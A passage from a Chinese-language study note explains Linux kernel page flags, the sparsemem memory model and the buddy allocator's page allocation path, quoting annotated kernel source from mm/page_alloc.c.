/* If pagecache, has fs-private data */      PG_private_2,        /* If pagecache, has fs aux data */      PG_writeback,        /* Page is under writeback */      PG_head,        /* A head page */      PG_mappedtodisk,    /* Has blocks allocated on-disk */      PG_reclaim,        /* To be reclaimed asap */      PG_swapbacked,        /* Page is backed by RAM/swap */      PG_unevictable,        /* Page is &quot;unevictable&quot;  */  #ifdef CONFIG_MMU      PG_mlocked,        /* Page is vma mlocked */  #endif  #ifdef CONFIG_ARCH_USES_PG_UNCACHED      PG_uncached,        /* Page has been mapped as uncached */  #endif  #ifdef CONFIG_MEMORY_FAILURE      PG_hwpoison,        /* hardware poisoned page. Don&#39;t touch */  #endif  #if defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)      PG_young,      PG_idle,  #endif  #ifdef CONFIG_64BIT      PG_arch_2,  #endif      __NR_PAGEFLAGS,        /* Filesystems */      PG_checked = PG_owner_priv_1,        /* SwapBacked */      PG_swapcache = PG_owner_priv_1,    /* Swap page: swp_entry_t in private */        /* Two page bits are conscripted by FS-Cache to maintain local caching       * state.  These bits are set on pages belonging to the netfs&#39;s inodes       * when those inodes are being locally cached.       */      PG_fscache = PG_private_2,    /* page backed by cache */        /* XEN */      /* Pinned in Xen as a read-only pagetable page. */      PG_pinned = PG_owner_priv_1,      /* Pinned as part of domain save (see xen_mm_pin_all()). */      PG_savepinned = PG_dirty,      /* Has a grant mapping of another (foreign) domain&#39;s page. */      PG_foreign = PG_owner_priv_1,      /* Remapped by swiotlb-xen. */      PG_xen_remapped = PG_owner_priv_1,        /* SLOB */      PG_slob_free = PG_private,        /* Compound pages. Stored in first tail page&#39;s flags */      PG_double_map = PG_workingset,        /* non-lru isolated movable page */      PG_isolated = PG_reclaim,        /* Only valid for buddy pages. Used to track pages that are reported */      PG_reported = PG_uptodate,  &#125;;</code></pre><p>  这里采用的复用的手法，也就是说flags字段还容纳了其他元素，如下，结构划分位于<code>/include/linux/page-flags-layout.h</code>当中</p><pre><code class="hljs">  /*   * page-&gt;flags layout:   *   * There are five possibilities for how page-&gt;flags get laid out.  The first   * pair is for the normal case without sparsemem. The second pair is for   * sparsemem when there is plenty of space for node and section information.   * The last is when there is insufficient space in page-&gt;flags and a separate   * lookup is necessary.   *   * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |   *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |   * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |   *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |   * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |   */</code></pre></li></ul><p> 可以看到在不同布局下他其实是可以用作指向归属的<code>zone</code>和<code>node</code>的</p><ul><li><p><strong>_mapcount</strong>：记录该页被页表映射的次数，初始值为-1，他是一个根据不同情况所采用的联合结构体，如果说他是被用户空间所映射，那么他会记录被映射的次数，但若是他没被映射到用户空间，页不是<code>PageSlab</code>,那么他为page_type字段，它定义于<code>/include/linux/page-flags.h</code>字段当中，如下：</p><pre><code class="hljs">  /*   * For pages that are never mapped to userspace (and aren&#39;t PageSlab),   * page_type may be used.  Because it is initialised to -1, we invert the   * sense of the bit, so __SetPageFoo *clears* the bit used for PageFoo, and   * __ClearPageFoo *sets* the bit used for PageFoo.  We reserve a few high and   * low bits so that an underflow or overflow of page_mapcount() won&#39;t be   * mistaken for a page type value.   */    #define PAGE_TYPE_BASE    0xf0000000  /* Reserve        0x0000007f to catch underflows of page_mapcount */  #define PAGE_MAPCOUNT_RESERVE    -128  #define PG_buddy    0x00000080  #define PG_offline    0x00000100  #define PG_table    0x00000200  #define PG_guard    0x00000400</code></pre></li><li><p><strong>_refcount</strong>：用作该页在内核中的引用次数，初值为0，若大于0表示正在被使用，等于0表示空闲或将要被释放，内核函数<code>get_page()</code>和<code>put_page()</code>函数会来进行引用计数的增减，后者若引用计数器为1则会调用<code>__put_single_page()</code>释放该页面</p></li><li><p><strong>vitrual</strong>：指向物理页框对应虚拟地址（这里有点疑问那就是他被多个页表映射咋办捏，还是说每次切换进程的时候会刷新一下这里呢？）</p></li></ul><p>说完数据结构，还记得上面<code>flags</code>不同布局下对应的结构吗，linux一般提供了三种内存模型，定义在<code>/include/asm-generic/memory_model.h</code><br><img src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d106098edf8643fb80e7aec90af.jpg"></p><p>常用模型是<code>sparsemem</code>,所以我们只了解他，中文翻译过来就是离散内存模型。在这个模型下，内存中会存在一个<code>mem_section</code>类型的指针数组，而其中元素指向的<code>mem_section</code>结构体中的<code>section_mem_map</code>成员会指向一个<code>struct page</code>类型的数组，它对应于一个连续的物理地址空间，如下图所示</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/962bd40735fae6cdb11e4aa84ab30f2443a70f55.jpg"></p><p>其中<code>mem_section</code>结构体的定义在<code>/include/linux/mmzone.h</code>当中，如下：</p><pre><code class="hljs">struct mem_section &#123;    /*     * This is, logically, a pointer to an array of struct     * pages.  However, it is stored with some other magic.     * (see sparse.c::sparse_init_one_section())     *     * Additionally during early boot we encode node id of     * the location of the section here to guide allocation.     * (see sparse.c::memory_present())     *     * Making it a UL at least makes someone do a cast     * before using it wrong.     */    unsigned long section_mem_map;    struct mem_section_usage *usage;#ifdef CONFIG_PAGE_EXTENSION    /*     * If SPARSEMEM, pgdat doesn&#39;t have page_ext pointer. We use     * section. (see page_ext.h about this.)     */    struct page_ext *page_ext;    unsigned long pad;#endif    /*     * WARNING: mem_section must be a power-of-2 in size for the     * calculation and use of SECTION_ROOT_MASK to make sense.     */&#125;;</code></pre><p>而我们的全局<code>mem_section</code>数组存放着指向所有<code>struct mem_section</code>结构体的指针，定义于<code>/mm/sparse.c</code>当中：</p><pre><code class="hljs">#ifdef CONFIG_SPARSEMEM_EXTREMEstruct mem_section **mem_section;#elsestruct mem_section mem_section[NR_SECTION_ROOTS][SECTIONS_PER_ROOT]    ____cacheline_internodealigned_in_smp;#endif</code></pre><p>咱们之前说到的数据结构都会使用<code>PFN</code>进行表示物理地址，但实际上他并不是物理地址，而是对应的某一个<code>page</code>的，而<code>pfn</code>的含义就是<code>page frame number</code>，他为每个物理页框所在位置都编了个号。而我们要通过<code>PFN</code>找到<code>page</code>或通过<code>page</code>找到<code>PFN</code>都需要这个<code>mem_section</code>结构体中的<code>section_mem_map</code>来实现。</p><h2 id="2-伙伴系统"><a href="#2-伙伴系统" class="headerlink" title="2.伙伴系统"></a>2.伙伴系统</h2><p>我们刚刚已经知道了，每个<code>zone</code>中包含一个<code>free_area</code>数组，其中就是一个个的双链表，且按照了<code>buddy system</code>的<code>order</code>进行管理，<br><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ec9b54b0de27d0f703908fc185.jpg"></p><p>而我们一个<code>free_area</code>中其实并不只有一个双向链表，free_area里面包含一个<code>free_list</code>数组，他是按照不同的<code>migrate type</code>也就是迁移类型进行存放，主要是为了避免内存过于碎片化，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/cb8065380cd79123d89a77bde8345982b3b78085.jpg"></p><p>而这里的页面存在一个迁移类型，这决定了该页是否可以迁移，如下：</p><pre><code class="hljs">enum migratetype &#123;    MIGRATE_UNMOVABLE, //不可移动    MIGRATE_MOVABLE, //不可移动    MIGRATE_RECLAIMABLE, //不能直接移动，但可以删除，例如文件映射页    MIGRATE_PCPTYPES,/* the number of types on the pcp lists */ //仅限同一节点内移动    MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,#ifdef CONFIG_CMA    /*     * MIGRATE_CMA migration type is designed to mimic the way     * ZONE_MOVABLE works.  Only movable pages can be allocated     * from MIGRATE_CMA pageblocks and page allocator never     * implicitly change migration type of MIGRATE_CMA pageblock.     *     * The way to use it is to change migratetype of a range of     * pageblocks to MIGRATE_CMA which can be done by     * __free_pageblock_cma() function.  What is important though     * is that a range of pageblocks must be aligned to     * MAX_ORDER_NR_PAGES should biggest page be bigger then     * a single pageblock.     */    MIGRATE_CMA, //连续的物理内存#endif#ifdef CONFIG_MEMORY_ISOLATION    MIGRATE_ISOLATE,/* can&#39;t allocate from here */#endif    MIGRATE_TYPES&#125;;</code></pre><p>下面仍然是一个<code>arttnba3</code>师傅所做的图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9d368d7107c01213fb90e91b6.jpg"></p><p>而<code>free_area</code>中的结构中的<code>nr_free</code>表示的是当前<code>free_area</code>中空闲页面块（而非单个page）的数量</p><pre><code class="hljs">struct free_area &#123;    struct list_headfree_list[MIGRATE_TYPES];    unsigned longnr_free;&#125;;</code></pre><p>而伙伴系统的含义就是在我们分配一定数量的page的时候，会根据order来进行分配，如果低阶的order不够的话，那就将高阶的order块拆分成两份链接到低阶的order，而如果我们释放page的时候，那就会放入到伙伴系统当中，并在本阶里面找到他的一个兄弟（这个兄弟是根据物理页框号pfn来判断是否相邻，然后根据一个宏定义算法可以得知本阶的一个唯一page块兄弟，若找到则合并且放入高阶order），这也就是**<code>伙伴</code>**二字的含义</p><h3 id="1-分配页框"><a href="#1-分配页框" class="headerlink" title="1. 分配页框"></a>1. 分配页框</h3><p>内核中实现了几个函数接口来请求页框，最终都会调用<code>__alloc_pages_nodemask</code>，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/11385343fbf2b211dbb767878f8065380dd78e5a.jpg"></p><p>其中核心的函数就是<code>__alloc_pages_nodemask</code>,这里我们需要先知道<code>gfp_mask</code>和<code>alloc_flags</code>这两个标志</p><p><strong>gfp_flags</strong></p><ol><li>__GFP_DMA：请求在ZONE_DMA区域中分配页面；</li><li>__GFP_HIGHMEM：请求在ZONE_HIGHMEM区域中分配页面；</li><li>__GFP_MOVABLE：ZONE_MOVALBE可用时在该区域分配页面，同时表示页面分配后可以在内存压缩时进行迁移，也能进行回收；</li><li>__GFP_RECLAIMABLE：请求分配到可恢复页面；</li><li>__GFP_HIGH：高优先级处理请求；</li><li>__GFP_IO：请求在分配期间进行 I&#x2F;O 操作；</li><li>__GFP_FS：请求在分配期间进行文件系统调用；</li><li>__GFP_ZERO：请求将分配的区域初始化为 0；</li><li>__GFP_NOFAIL：不允许请求失败，会无限重试；</li><li>__GFP_NORETRY：请求不重试内存分配请求；<br>这里我是直接引用的cft56200_ln师傅的图<br><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304ebfdb423394c8a786c8175c7a.jpg"></li></ol><p><strong>alloc_flags</strong></p><ol><li>ALLOC_WMARK_MIN：仅在最小水位water mark及以上限制页面分配；</li><li>ALLOC_WMARK_LOW：仅在低水位water mark及以上限制页面分配；</li><li>ALLOC_WMARK_HIGH：仅在高水位water mark及以上限制页面分配；</li><li>ALLOC_HARDER：努力分配，一般在gfp_mask设置了__GFP_ATOMIC时会使用；</li><li>ALLOC_HIGH：高优先级分配，一般在gfp_mask设置了__GFP_HIGH时使用；</li><li>ALLOC_CPUSET：检查是否为正确的 cpuset；</li><li>ALLOC_CMA：允许从 CMA 区域进行分配</li></ol><p>下面就是该核心函数的函数体部分，他位于<code>/mm/page_alloc.c</code>当中，如下：</p><pre><code class="hljs">/* * This is the &#39;heart&#39; of the zoned buddy allocator.（看好了，兄弟系统是这么用的） */struct page *__alloc_pages_nodemask(gfp_t gfp_mask, unsigned int order, int preferred_nid,                            nodemask_t *nodemask)&#123;    struct page *page;    unsigned int alloc_flags = ALLOC_WMARK_LOW;    gfp_t alloc_mask; /* The gfp_t that was actually used for allocation */    struct alloc_context ac = &#123; &#125;;    /*     * There are several places where we assume that the order value is sane     * so bail out early if the request is out of bound.     */    if (unlikely(order &gt;= MAX_ORDER)) &#123;        WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));        return NULL;    &#125;    gfp_mask &amp;= gfp_allowed_mask;    alloc_mask = gfp_mask;    if (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))        return NULL;    /*     * Forbid the first pass from falling back to types that fragment     * memory until all local zones are considered.     */    alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);    /* First allocation attempt */    page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);    if (likely(page))        goto out;    /*     * Apply scoped allocation constraints. This is mainly about GFP_NOFS     * resp. GFP_NOIO which has to be inherited for all allocation requests     * from a particular context which has been marked by     * memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;.     */    alloc_mask = current_gfp_context(gfp_mask);    ac.spread_dirty_pages = false;    /*     * Restore the original nodemask if it was potentially replaced with     * &amp;cpuset_current_mems_allowed to optimize the fast-path attempt.     */    ac.nodemask = nodemask;    page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);out:    if (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;        unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != 0)) &#123;        __free_pages(page, order);        page = NULL;    &#125;    trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);    return page;&#125;EXPORT_SYMBOL(__alloc_pages_nodemask);</code></pre><p>上面函数概括为下面的步骤：</p><ol><li>检测环境，准备分配</li><li>快速分配，调用<code>get_page_from_freelist()</code></li><li>慢速分配，调用<code>__alloc_pages_slowpath()</code></li><li>快慢均失败，考虑页面回收，杀死进程后再次尝试</li></ol><p>其中准备函数<code>prepare_alloc_pages()</code>是设定一下环境值且从指定参数<code>node</code>中获取一个<code>zonelist</code>，这里就不多讲了，直接来讲解快速分配函数<code>get_page_from_freelist()</code>,他位于<code>/mm/page_alloc.c</code></p><pre><code class="hljs">static struct page *get_page_from_freelist(gfp_t gfp_mask, unsigned int order, int alloc_flags,                        const struct alloc_context *ac)&#123;    struct zoneref *z;    struct zone *zone;    struct pglist_data *last_pgdat_dirty_limit = NULL;    bool no_fallback;retry:    /*     * 扫描 zonelist, 寻找有着足够空闲块的zone     * See also __cpuset_node_allowed() comment in kernel/cpuset.c.     */    no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;    z = ac-&gt;preferred_zoneref;    for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,                    ac-&gt;nodemask) &#123;        struct page *page;        unsigned long mark;        if (cpusets_enabled() &amp;&amp;            (alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;            !__cpuset_zone_allowed(zone, gfp_mask))                continue;        /*         * When allocating a page cache page for writing, we         * want to get it from a node that is within its dirty         * limit, such that no single node holds more than its         * proportional share of globally allowed dirty pages.         * The dirty limits take into account the node&#39;s         * lowmem reserves and high watermark so that kswapd         * should be able to balance it without having to         * write pages from its LRU list.         *         * XXX: For now, allow allocations to potentially         * exceed the per-node dirty limit in the slowpath         * (spread_dirty_pages unset) before going into reclaim,         * which is important when on a NUMA setup the allowed         * nodes are together not big enough to reach the         * global limit.  The proper fix for these situations         * will require awareness of nodes in the         * dirty-throttling and the flusher threads.         */        if (ac-&gt;spread_dirty_pages) &#123;            if (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)                continue;            if (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;                last_pgdat_dirty_limit = zone-&gt;zone_pgdat;                continue;            &#125;        &#125;        if (no_fallback &amp;&amp; nr_online_nodes &gt; 1 &amp;&amp;            zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;            int local_nid;            /*             * If moving to a remote node, retry but allow             * fragmenting fallbacks. Locality is more important             * than fragmentation avoidance.             */            local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);            if (zone_to_nid(zone) != local_nid) &#123;                alloc_flags &amp;= ~ALLOC_NOFRAGMENT;                goto retry;            &#125;        &#125;        mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);        if (!zone_watermark_fast(zone, order, mark,                       ac-&gt;highest_zoneidx, alloc_flags,                       gfp_mask)) &#123;            int ret;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT            /*             * Watermark failed for this zone, but see if we can             * grow this zone if it contains deferred pages.             */            if (static_branch_unlikely(&amp;deferred_pages)) &#123;                if (_deferred_grow_zone(zone, order))                    goto try_this_zone;            &#125;#endif            /* Checked here to keep the fast path fast */            BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);            if (alloc_flags &amp; ALLOC_NO_WATERMARKS)                goto try_this_zone;            if (node_reclaim_mode == 0 ||                !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))                continue;            ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);            switch (ret) &#123;            case NODE_RECLAIM_NOSCAN:                /* did not scan */                continue;            case NODE_RECLAIM_FULL:                /* scanned but unreclaimable */                continue;            default:                /* did we reclaim enough */                if (zone_watermark_ok(zone, order, mark,                    ac-&gt;highest_zoneidx, alloc_flags))                    goto try_this_zone;                continue;            &#125;        &#125;try_this_zone:   //本zone正常水位        page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,                gfp_mask, alloc_flags, ac-&gt;migratetype);        if (page) &#123;            prep_new_page(page, order, gfp_mask, alloc_flags);            /*             * If this is a high-order atomic allocation then check             * if the pageblock should be reserved for the future             */            if (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))                reserve_highatomic_pageblock(page, zone, order);            return page;        &#125; else &#123;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT            /* Try again if zone has deferred pages */            if (static_branch_unlikely(&amp;deferred_pages)) &#123;                if (_deferred_grow_zone(zone, order))                    goto try_this_zone;            &#125;#endif        &#125;    &#125;    /*     * It&#39;s possible on a UMA machine to get through all zones that are     * fragmented. If avoiding fragmentation, reset and try again.     */    if (no_fallback) &#123;        alloc_flags &amp;= ~ALLOC_NOFRAGMENT;        goto retry;    &#125;    return NULL;&#125;</code></pre><p>其功能就是首先遍历当前的<code>zone</code>，判断当前<code>zone</code>是否满足low water mark水位，若不满足则进行一次快速回收操作，再次检测水位情况，若还是不能满足，则遍历下一个<code>zone</code>，然后采取同样的步骤，最后进入<code>rmqueue</code>函数，这就是<code>buddy system</code>的核心，过程可以简化看下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/11385343fbf2b211d43468878f8065380dd78ee5.jpg"></p><p>相比于代码，下图更加直观，之后我们来查看关键函数<code>rmqueue()</code>,它位于<code>/mm/page_alloc.c</code></p><pre><code class="hljs">/* * 从所给zone中获取页. 当order为0的时候，使用pcplists. */static inlinestruct page *rmqueue(struct zone *preferred_zone,            struct zone *zone, unsigned int order,            gfp_t gfp_flags, unsigned int alloc_flags,            int migratetype)&#123;    unsigned long flags;    struct page *page;    if (likely(order == 0)) &#123;        /*         * 若没有开启`CMA`|设置`ALLOC_CMA`|迁移类型为MIGRATE_MOVABLE，则先从pcplist上分配         */        if (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||                migratetype != MIGRATE_MOVABLE) &#123;            page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,                    migratetype, alloc_flags);            goto out;        &#125;    &#125;    /*     * We most definitely don&#39;t want callers attempting to     * allocate greater than order-1 page units with __GFP_NOFAIL.     */    WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; 1));    spin_lock_irqsave(&amp;zone-&gt;lock, flags);    do &#123;        page = NULL;        /*         * order-0 request can reach here when the pcplist is skipped         * due to non-CMA allocation context. HIGHATOMIC area is         * reserved for high-order atomic allocation, so order-0         * request should skip it.         */        if (order &gt; 0 &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123; //order大于0且带有ALLOC_HARDER，使用__rmqueue_smallest分配            page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);            if (page)                trace_mm_page_alloc_zone_locked(page, order, migratetype);        &#125;        /*         * 执行到这里说明order&gt;0,我们采用__rmqueue函数，这是真正的兄弟系统核心分配函数         */        if (!page)            page = __rmqueue(zone, order, migratetype, alloc_flags);    &#125; while (page &amp;&amp; check_new_pages(page, order));    spin_unlock(&amp;zone-&gt;lock);    if (!page)        goto failed;    __mod_zone_freepage_state(zone, -(1 &lt;&lt; order),                  get_pcppage_migratetype(page));    __count_zid_vm_events(PGALLOC, page_zonenum(page), 1 &lt;&lt; order);    zone_statistics(preferred_zone, zone);    local_irq_restore(flags);out:    /* Separate test+clear to avoid unnecessary atomics */    if (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;        clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);        wakeup_kswapd(zone, 0, 0, zone_idx(zone));    &#125;    VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);    return page;failed:    local_irq_restore(flags);    return NULL;&#125;</code></pre><p>有部分注释，我在上面中西合璧标注了一下，接下来先提醒大家伙，之前咱们讲解<code>zone</code>上的一个字段<code>per-cpu pageset</code>,他是为了放置条件竞争的问题，为每个cpu单独设置一个仓库用来为<code>buddy system</code>进行迅速的分配，这里就是给出了<code>buddy system</code>先从他里面调用的函数代码，总结为一下流程</p><ol><li>若<code>order</code>为0，若没有开启<code>CMA</code>|设置<code>ALLOC_CMA</code>|迁移类型为MIGRATE_MOVABLE，则先从per-cpu pageset 中分配并且返回</li><li>order &gt;0 调用<code>__rmqueue_smallest()</code>分配</li><li>若未分配成功，这里不管order是否为0，调用<code>__rmqueue()</code>分配</li><li>结果检查，调用<code>check_new_pages()</code>，未通过则循环跳到第二步</li></ol><p>我们一个一个关键函数来查看，首先是分配<code>per_cpu_pageset</code>,也就是如下函数</p><p><strong>rmqueue_pcplist()</strong></p><pre><code class="hljs">/* Lock and remove page from the per-cpu list */static struct page *rmqueue_pcplist(struct zone *preferred_zone,            struct zone *zone, gfp_t gfp_flags,            int migratetype, unsigned int alloc_flags)&#123;    struct per_cpu_pages *pcp;    struct list_head *list;    struct page *page;    unsigned long flags;    local_irq_save(flags); // 关中断    pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;    list = &amp;pcp-&gt;lists[migratetype]; // 获取迁移类型链表    page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, list); // 分配    if (page) &#123;        __count_zid_vm_events(PGALLOC, page_zonenum(page), 1);        zone_statistics(preferred_zone, zone);    &#125;    local_irq_restore(flags); // 开中断    return page;&#125;</code></pre><p>主要是进行了一些同步互斥操作（开关中断），然后调用函数<code>__rmqueue_pcplist</code></p><pre><code class="hljs">/* 从 per-cpu 链表上取出 page, 调用者必须保护链表 */static struct page *__rmqueue_pcplist(struct zone *zone, int migratetype,            unsigned int alloc_flags,            struct per_cpu_pages *pcp,            struct list_head *list)&#123;    struct page *page;    do &#123;        if (list_empty(list)) &#123; // list 是空的            //             pcp-&gt;count += rmqueue_bulk(zone, 0,                    READ_ONCE(pcp-&gt;batch), list,                    migratetype, alloc_flags);            if (unlikely(list_empty(list)))                return NULL;        &#125;        // 链表脱链        page = list_first_entry(list, struct page, lru);        list_del(&amp;page-&gt;lru);        pcp-&gt;count--;    &#125; while (check_new_pcp(page));    return page;&#125;</code></pre><p>这里先判定链表，若为空，则调用<code>rmqueue_bulk()</code>函数，从<code>zone</code>上拿到pages之后再进行<code>unlink</code>，而<code>rmqueue_bulk()</code>函数最终会调用<code>__rmqueue()</code></p><pre><code class="hljs">/* * 为了高效率，从 buddy 分配器获得指定数量的元素,  * 所有的单个元素都在持有锁的情况下进行.  将其添加到提供的链表中. * 返回放置在 *list 链表上的 pages 数量. */static int rmqueue_bulk(struct zone *zone, unsigned int order,            unsigned long count, struct list_head *list,            int migratetype, unsigned int alloc_flags)&#123;    int i, alloced = 0;    spin_lock(&amp;zone-&gt;lock);    for (i = 0; i &lt; count; ++i) &#123;        struct page *page = __rmqueue(zone, order, migratetype,                                alloc_flags);        if (unlikely(page == NULL))            break;        if (unlikely(check_pcp_refill(page)))            continue;        /*         * 由 expand() 返回的分割 buddy 页面在此处以物理页框顺序接收。         * 页面被添加到 caller 的链表尾部。从 caller 的角度看，链表在         * 某些情况下是按照页码排序的。这对一些可以从头部前向的IO设备是有用的，         * 因为链表也是在物理页的顺序上的。这对于可以在物理页合理排序的情况下         * 合并IO请求的IO设备是有用的。         */        list_add_tail(&amp;page-&gt;lru, list);        alloced++;        if (is_migrate_cma(get_pcppage_migratetype(page)))            __mod_zone_page_state(zone, NR_FREE_CMA_PAGES,                          -(1 &lt;&lt; order));    &#125;    /*     * i pages were removed from the buddy list even if some leak due     * to check_pcp_refill failing so adjust NR_FREE_PAGES based     * on i. Do not confuse with &#39;alloced&#39; which is the number of     * pages added to the pcp list.     */    __mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));    spin_unlock(&amp;zone-&gt;lock);    return alloced;&#125;</code></pre><p><strong>__rmqueue_smallest</strong><br>该函数就是由order对应的<code>free_area</code>中类型为<code>migration type</code>的链表上进行分配，如果不够则向高order处请求，由于这里都是以2^order来进行分配，因此如果说我order为1，且这里不够的话，我们就转而order为2的链表，将其中的块对半拆下到低order中，其中向更高order分配是通过循环和脱链完成，而拆高阶的page是通过<code>expand()</code>函数来进行的</p><pre><code class="hljs">/* * 对给定的 migrationtype 遍历 free lists  * 并从 freelists 上移除最小可用的页面 */static __always_inlinestruct page *__rmqueue_smallest(struct zone *zone, unsigned int order,                        int migratetype)&#123;    unsigned int current_order;    struct free_area *area;    struct page *page;    /* 在 preferred list 上寻找一个合适 size 的 page */    for (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;        area = &amp;(zone-&gt;free_area[current_order]);        page = get_page_from_free_area(area, migratetype);        if (!page)            continue;        del_page_from_free_list(page, zone, current_order);        expand(zone, page, order, current_order, migratetype);        set_pcppage_migratetype(page, migratetype);        return page;    &#125;    return NULL;&#125;</code></pre><p>而拆分函数<code>expand</code>也比较简单</p><pre><code class="hljs">/* * 此处再分割的顺序对 IO subsystem 而言是十分重要的. * 请不要在有好的理由及回归测试前改变这个顺序。 * 特别地，当大块的内存被分割，更小块（内存）被传递的顺序 * 则由他们在该函数中被分割的顺序决定。 * 根据实际测试，这是影响传递给IO子系统的 pages 顺序的主要因素， * 考虑到包含一个内存大块（由一系列小的分配作用）的 buddy system 的行为， * 这也是合理的。这种行为是 sglist 合并成功的关键因素。 * * -- nyc */static inline void expand(struct zone *zone, struct page *page,    int low, int high, int migratetype)&#123;    unsigned long size = 1 &lt;&lt; high;    while (high &gt; low) &#123;        high--;        size &gt;&gt;= 1;        VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);        /*         * 标记为 guard pages (或 page), 这将允许在 buddy 将被         * 释放时合并回分配器.对应的页表项不会被创建，         * pages 在 虚拟地址空间上仍将保持不存在。         */        if (set_page_guard(zone, &amp;page[size], high, migratetype))            continue;        add_to_free_list(&amp;page[size], zone, high, migratetype);        set_buddy_order(&amp;page[size], high);    &#125;&#125;</code></pre><p><strong>__rmqueue()</strong></p><p>最开始我以为这个才是最终函数，但其实他不是，他反而还会调用<code>__rmqueue_smallest()</code></p><pre><code class="hljs">/* * 从 buddy allocator 上移除一个元素. * 在持有 zone-&gt;lock 时调用. */static __always_inline struct page *__rmqueue(struct zone *zone, unsigned int order, int migratetype,                        unsigned int alloc_flags)&#123;    struct page *page;    if (IS_ENABLED(CONFIG_CMA)) &#123;        /*         * 通过当半数空闲内存在 CMA 区域时从 CMA 中分配         * 以平衡常规的与CMA区域的可迁移的分配。         */        if (alloc_flags &amp; ALLOC_CMA &amp;&amp;            zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;            zone_page_state(zone, NR_FREE_PAGES) / 2) &#123;            page = __rmqueue_cma_fallback(zone, order);            if (page)                goto out;        &#125;    &#125;retry:    page = __rmqueue_smallest(zone, order, migratetype);    if (unlikely(!page)) &#123;        if (alloc_flags &amp; ALLOC_CMA)            page = __rmqueue_cma_fallback(zone, order);        if (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,                                alloc_flags))            goto retry;    &#125;out:    if (page)        trace_mm_page_alloc_zone_locked(page, order, migratetype);    return page;&#125;</code></pre><p>整体快速分配可以看下面这张图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfadde22b27f18f8c5495ee7b69.jpg"></p><p>我们了解完了快速分配，接下来就是慢速分配了，其中他的功能包括了内存碎片化的整理和回收，他的代码太长，我就也只贴一部分，如下：</p><pre><code class="hljs">static inline struct page *__alloc_pages_slowpath(gfp_t gfp_mask, unsigned int order,      struct alloc_context *ac)&#123;  page = __alloc_pages_direct_compact(gfp_mask, order,       alloc_flags, ac,      INIT_COMPACT_PRIORITY,      &amp;compact_result);  ......  page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,        &amp;did_some_progress);  ......&#125;</code></pre><p>其中内存碎片化也即是利用到迁移的知识，这里有两个关键函数，其中之一就是<code>__alloc_pages_direct_compact</code></p><pre><code class="hljs">static struct page *__alloc_pages_direct_compact(gfp_t gfp_mask, unsigned int order,  unsigned int alloc_flags, const struct alloc_context *ac,  enum compact_priority prio, enum compact_result *compact_result)&#123; struct page *page; unsigned int noreclaim_flag;  if (!order)  return NULL;  noreclaim_flag = memalloc_noreclaim_save(); *compact_result = try_to_compact_pages(gfp_mask, order, alloc_flags, ac,         prio); memalloc_noreclaim_restore(noreclaim_flag);  if (*compact_result &lt;= COMPACT_INACTIVE)  return NULL;  count_vm_event(COMPACTSTALL);  page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);  if (page) &#123;  struct zone *zone = page_zone(page);   zone-&gt;compact_blockskip_flush = false;  